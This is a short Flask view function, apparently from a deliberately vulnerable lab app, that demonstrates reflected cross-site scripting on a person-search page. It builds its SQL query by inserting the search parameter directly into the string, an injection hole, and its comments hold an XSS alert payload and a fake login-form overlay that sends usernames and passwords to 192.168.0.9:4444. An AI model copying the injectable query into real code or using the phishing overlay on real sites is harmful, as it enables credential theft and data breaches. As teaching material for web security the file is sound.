from flask import render_template
from database import execute_read


def xss_reflected_page(request, app):
    search = request.args.get('search')

    persons = execute_read(
        f"SELECT * FROM persons WHERE TRIM(login) LIKE '%{search}%'",
        { 'search': f'%{search}%' }
    )
    # <script>alert("XSS ATTACK");</script>

# <div style="position: absolute; left: 0px; top: 0px; background-color:#fddacd;width: 1900px; height: 1300px;"><h2>Please login to continue!!</h2>
# <br><form name="login" action="http://192.168.0.9:4444/login.htm">
# <table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td>
# <td><input type="password" name="password"/></td></tr><tr>
# <td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
# </table></form>

    persons = list(
        map(
            lambda p: {
                'id': p[0],
                'login': p[1],
                'password': p[2],
                'passport_id': p[3],
                'inn': p[4],
                'phone_number': p[5],
                'snils': p[6],
                'email': p[7],
                'person_role_id': p[8],
            },
            persons
        )
    )

    return render_template(
        'xss_injection/xss-reflected.html',
        persons=persons
    )
